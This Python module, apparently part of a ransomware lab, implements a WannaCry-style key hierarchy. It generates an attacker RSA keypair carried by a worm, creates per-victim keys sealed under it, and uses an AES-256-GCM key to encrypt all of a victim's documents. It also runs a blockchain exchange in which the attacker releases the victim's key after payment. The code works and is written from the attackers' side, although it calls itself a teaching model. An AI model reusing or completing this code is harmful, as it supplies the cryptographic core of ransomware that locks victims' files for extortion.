"""Layered ransomware key logic, as in the original v2 implementation.

The WannaCry-style key hierarchy, as a teaching model:

  1. attacker_priv / attacker_pub are created only on the attacker machine.
     attacker_pub travels inside the worm; attacker_priv never leaves it.
  2. On each victim, running the payload generates victim_priv / victim_pub.
     victim_priv is sealed under attacker_pub (AES-GCM + RSA-OAEP) and stored
     locally; victim_pub stays in plaintext.
  3. One AES-256-GCM file key encrypts all the documents. It is sealed under
     victim_pub and stored locally.

  Decryption chain: attacker_priv -> victim_priv -> file key -> files.

For the blockchain exchange there is no privacy sealing: as the attackers we
do not care about victim confidentiality, so key material travels on-chain as
it is. The victim posts the sealed victim_priv blob; after payment the
attacker posts the recovered victim_priv back in plaintext. Ethereum wallet
keys are unrelated to this module.
"""

import base64
import hashlib
import json
import os
from pathlib import Path
import tempfile

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

RSA_BITS = 2048


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def unb64(text: str) -> bytes:
    return base64.b64decode(text.encode("ascii"))


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def write_atomic(path: Path, data: bytes):
    """Replace one file after flushing its complete new contents to disk."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    handle, temporary = tempfile.mkstemp(dir=path.parent, prefix=".lab-")
    try:
        with os.fdopen(handle, "wb") as stream:
            stream.write(data)
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
        directory = os.open(path.parent, os.O_RDONLY)
        try:
            os.fsync(directory)
        finally:
            os.close(directory)
    finally:
        if os.path.exists(temporary):
            os.unlink(temporary)


def write_json(path: Path, value: dict, private: bool = False):
    """Save JSON with the same atomic replacement, optionally owner-only."""
    if private:
        old_umask = os.umask(0o077)
        try:
            write_atomic(path, (json.dumps(value, indent=2) + "\n").encode("utf-8"))
        finally:
            os.umask(old_umask)
        os.chmod(path, 0o600)
    else:
        write_atomic(path, (json.dumps(value, indent=2) + "\n").encode("utf-8"))


def read_json(path: Path) -> dict:
    return json.loads(Path(path).read_text(encoding="utf-8"))


def new_rsa_keypair():
    """Generate an RSA-2048 keypair (attacker or victim)."""
    return rsa.generate_private_key(public_exponent=65537, key_size=RSA_BITS)


def priv_pem_from(private) -> bytes:
    return private.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )


def pub_pem(public) -> bytes:
    return public.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def load_priv_pem(pem: bytes):
    return serialization.load_pem_private_key(pem, password=None)


def load_pub_pem(pem: bytes):
    return serialization.load_pem_public_key(pem)


def seal_with_rsa_pub(public, plaintext: bytes) -> dict:
    """Seal arbitrary bytes to one RSA public key.

    An ephemeral AES-256-GCM key encrypts the payload; that AES key is wrapped
    with RSA-OAEP-SHA256 under the given public key. Only the matching private
    key can open the seal.
    """
    aes_key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(12)
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)
    wrapped = public.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return {"wrap": b64(wrapped), "nonce": b64(nonce), "ct": b64(ciphertext)}


def unseal_with_rsa_priv(private, sealed: dict) -> bytes:
    """Open a seal produced by seal_with_rsa_pub with the matching private key."""
    aes_key = private.decrypt(
        unb64(sealed["wrap"]),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return AESGCM(aes_key).decrypt(unb64(sealed["nonce"]), unb64(sealed["ct"]), None)


# --------------------------------------------------------------------------
# Attacker side (their own machine, never a victim host)
# --------------------------------------------------------------------------

def create_attacker_keys(path: Path) -> Path:
    """Create the attacker keypair once. attacker_priv stays in this file."""
    if path.exists():
        raise ValueError("attacker keys already exist; refusing to overwrite")
    private = new_rsa_keypair()
    record = {
        "role": "attacker",
        "attacker_priv_pem": b64(priv_pem_from(private)),
        "attacker_pub_pem": pub_pem(private.public_key()).decode("ascii"),
    }
    write_json(path, record, private=True)
    print(f"attacker keypair created: {path}")
    print("attacker_pub (this is what the worm carries):")
    print(record["attacker_pub_pem"])
    return path


def attacker_open_victim_priv(attacker_priv_pem: bytes, keylog: dict) -> bytes:
    """Offline: use attacker_priv to unseal the victim's private key.

    Returns victim_priv PEM. The sealed blob is useless to anyone without this
    attacker private key; the attacker never needs to touch the victim host.
    """
    attacker_priv = load_priv_pem(attacker_priv_pem)
    keylog_pub = load_pub_pem(keylog["attacker_pub_pem"].encode("ascii"))
    own_pub = attacker_priv.public_key()
    if keylog_pub.public_numbers() != own_pub.public_numbers():
        raise ValueError("keylog was sealed under a different attacker key")
    return unseal_with_rsa_priv(attacker_priv, keylog["victim_priv_sealed"])


def attacker_open_request(attacker_keys: dict, request: dict) -> bytes:
    """The attacker's side: open one victim's sealed key, taken from its request.

    A request only carries the fingerprint of the attacker key it was sealed
    for, so a mismatch is the one thing that can be checked before trying.
    It happens when the attacker's keys were recreated after a victim was
    locked: nothing can open that request any more.
    """
    mine = sha256(attacker_keys["attacker_pub_pem"].encode("ascii"))[:16]
    if request.get("attacker_pub_fingerprint", mine) != mine:
        raise ValueError("this request was sealed for a different attacker key")
    return attacker_open_victim_priv(unb64(attacker_keys["attacker_priv_pem"]), {
        "attacker_pub_pem": attacker_keys["attacker_pub_pem"],
        "victim_priv_sealed": request["victim_priv_sealed"],
    })


def victim_open_file_key(victim_priv_pem: bytes, keylog: dict) -> bytes:
    """After the exchange: unseal the file key with the recovered victim_priv."""
    victim_priv = load_priv_pem(victim_priv_pem)
    keylog_pub = load_pub_pem(keylog["victim_pub_pem"].encode("ascii"))
    if keylog_pub.public_numbers() != victim_priv.public_key().public_numbers():
        raise ValueError("recovered victim key does not match this keylog")
    return unseal_with_rsa_priv(victim_priv, keylog["file_key_sealed"])


# --------------------------------------------------------------------------
# Blockchain exchange (plaintext on-chain; no privacy, we are the attackers)
# --------------------------------------------------------------------------

def build_exchange_request(keylog: dict) -> dict:
    """Victim side: build the on-chain request payload.

    The sealed victim_priv blob is copied from the keylog; it is inert without
    attacker_priv, so posting it on a public chain leaks nothing the attacker
    alone can open.
    """
    return {
        "participant_id": keylog["participant_id"],
        "victim_priv_sealed": keylog["victim_priv_sealed"],
        "attacker_pub_fingerprint": sha256(keylog["attacker_pub_pem"].encode("ascii"))[:16],
    }


def attacker_build_reply(victim_priv_pem: bytes) -> dict:
    """Attacker side: the on-chain reply carries victim_priv in plaintext."""
    return {
        "victim_priv_pem": victim_priv_pem.decode("ascii"),
    }


def victim_accept_reply(reply: dict, keylog: dict) -> dict:
    """Victim side: read the attacker's plaintext reply and unseal the file key."""
    if "victim_priv_pem" not in reply:
        raise ValueError("reply carries no victim key; nothing to accept")
    file_key = victim_open_file_key(reply["victim_priv_pem"].encode("ascii"), keylog)
    return {
        "victim_priv_pem": reply["victim_priv_pem"].encode("ascii"),
        "file_key": file_key,
    }
